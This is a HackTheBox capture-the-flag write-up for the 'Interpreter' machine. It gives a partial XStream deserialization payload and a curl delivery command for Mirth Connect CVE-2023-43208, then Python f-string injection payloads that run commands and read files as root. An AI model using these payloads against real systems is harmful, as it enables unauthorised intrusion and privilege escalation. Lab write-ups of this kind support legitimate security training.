---
title: "Interpreter — HackTheBox Writeup"
date: "2026-02-27"
description: "Medium Linux machine involving Mirth Connect CVE-2023-43208 pre-auth Java deserialization RCE and Python f-string injection via internal service running as root"
tags: ['hackthebox', 'writeup', 'linux', 'CVE', 'java deserialization', 'code injection', 'web pentest']
thumbnail: ""
---

# Interpreter — HTB Labs Machine Writeup

**Difficulty:** Medium
**OS:** Linux (Debian 12)

---

## Attack Chain Summary

```
Mirth Connect 4.4.0 on Jetty
    → CVE-2023-43208 (Pre-auth Java deserialization RCE)
        → Shell as mirth service user
            → mirth.properties → MariaDB credentials
                → Internal service discovery: notif.py on 127.0.0.1:54321 (root)
                    → Python f-string injection → RCE as root
```

---

## Phase 1: Reconnaissance

### Port Scan

| Port | Service | Details |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian |
| 80/tcp | HTTP | Jetty — Mirth Connect Administrator |
| 443/tcp | HTTPS | Jetty — Mirth Connect Administrator |

Mirth Connect version 4.4.0 confirmed via API:

```bash
curl -sk -H 'X-Requested-With: XMLHttpRequest' \
  https://10.129.244.184/api/server/version
```

---

## Phase 2: Initial Access — CVE-2023-43208

### Vulnerability

**CVE-2023-43208** is a pre-authentication RCE in Mirth Connect < 4.4.1. It exploits Java deserialization via XStream on the `/api/users` endpoint using Apache Commons Collections gadget chains.

### Exploitation

XML deserialization payload sent to `POST /api/users`:

```xml
<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <!-- ConstantTransformer → Runtime.class -->
                    <!-- InvokerTransformer chain → exec(reverse_shell) -->
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes><string>compareTo</string></eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

```bash
curl -sk -X POST 'https://10.129.244.184/api/users' \
  -H 'X-Requested-With: OpenAPI' \
  -H 'Content-Type: application/xml' \
  -d @payload.xml
```

Reverse shell received as `mirth` (uid=103).

---

## Phase 3: Enumeration

### Mirth Connect Configuration

From `/usr/local/mirthconnect/conf/mirth.properties`:

| Key | Value |
|-----|-------|
| database.url | `jdbc:mariadb://localhost:3306/mc_bdd_prod` |
| database.username | `mirthdb` |
| database.password | `<redacted>` |
| keystore.storepass | `<redacted>` |
| keystore.keypass | `<redacted>` |

### Internal Service Discovery

- **notif.py** running as **root** on `127.0.0.1:54321`
- Mirth channel "INTERPRETER - HL7 TO XML TO NOTIFY" forwards HL7 messages as XML to `http://127.0.0.1:54321/addPatient`
- Channel transforms HL7 fields to XML: `timestamp`, `sender_app`, `id`, `firstname`, `lastname`, `birth_date`, `gender`

---

## Phase 4: Privilege Escalation — Python f-string Injection

### Discovery

Testing the internal `/addPatient` endpoint — injecting `{` in `firstname`:

```
[EVAL_ERROR] f-string: expecting '}' (<string>, line 1)
```

This confirms the server uses Python `eval(f"...")` on user input — **f-string injection**.

### Character Filtering

| Character | Result |
|-----------|--------|
| alpha/underscore/dot/paren | Allowed |
| space/dollar/backtick/pipe/semicolon | Blocked (`[INVALID_INPUT]`) |
| `{` | Triggers f-string eval error |

### Exploitation

```xml
<firstname>{__import__('os').popen('id').read()}</firstname>
```

Response: `Patient uid=0(root) gid=0(root) groups=0(root) Doe (M)...`

### Reading Flags

```xml
<!-- User flag -->
<firstname>{open('/home/sedric/user.txt').read()}</firstname>

<!-- Root flag -->
<firstname>{open('/root/root.txt').read()}</firstname>
```

Both flags obtained via f-string injection running as root.

---

## Key Takeaways

1. **CVE-2023-43208** — Mirth Connect < 4.4.1 has pre-auth RCE via Java deserialization on `/api/users`. XStream deserializes XML without authentication.

2. **Python f-string injection** — When Python uses `eval(f"...")` with user input, attackers inject arbitrary expressions inside `{}`. Key payload: `{__import__('os').popen('cmd').read()}`.

3. **Internal services on localhost are reachable from a foothold** — Always enumerate internal ports with `ss -tlnp`.

4. **Machine name as hint** — "Interpreter" directly hints at code interpretation/evaluation.

5. **Denylist-based filtering is insufficient** — Blocking common injection chars but missing `{` enabled f-string injection.

6. **Mirth Connect config mining** — `mirth.properties` contains database credentials, keystore passwords, and application configuration.

---

## Tools Used

- `nmap` — Port scanning
- `curl` — Mirth Connect API interaction, exploit delivery
- `ncat` — Reverse shell listener
- `python3` — f-string injection exploitation
- `mysql` — MariaDB enumeration
